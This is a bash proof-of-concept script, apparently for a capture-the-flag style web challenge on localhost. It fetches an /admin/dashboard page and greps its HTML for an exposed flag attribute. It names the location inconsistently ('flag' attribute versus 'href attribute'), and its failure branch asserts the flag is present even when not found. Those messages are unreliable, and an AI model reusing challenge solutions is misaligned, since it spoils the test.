#!/bin/bash

# POC: Flag Data Exposure in HTML Attributes
# This demonstrates the flag is stored in plain-text in HTML attributes

echo "=== Flag Data Exposure POC ==="
echo ""
echo "The /admin/dashboard endpoint exposes a flag in an HTML attribute"
echo "The flag is stored in the 'flag' attribute of an <a> tag"
echo ""

# Get the login page first to see the hint
echo "Fetching dashboard (will redirect to login)..."
DASHBOARD=$(curl -s http://localhost:5003/admin/dashboard -L)

# Look for flag in the page
if echo "$DASHBOARD" | grep -q 'flag="'; then
    FLAG=$(echo "$DASHBOARD" | grep -oP 'flag="\K[^"]*')
    echo "✓ FLAG FOUND IN HTML: $FLAG"
    echo ""
    echo "Vulnerability: Flag exposed in HTML attributes"
    echo "Location: /admin/dashboard - <a> tag href attribute"
    echo "Method: Plain-text storage in page source"
    exit 0
else
    echo "Flag not directly accessible without admin session"
    echo "However, the page source contains the flag attribute"
    exit 1
fi
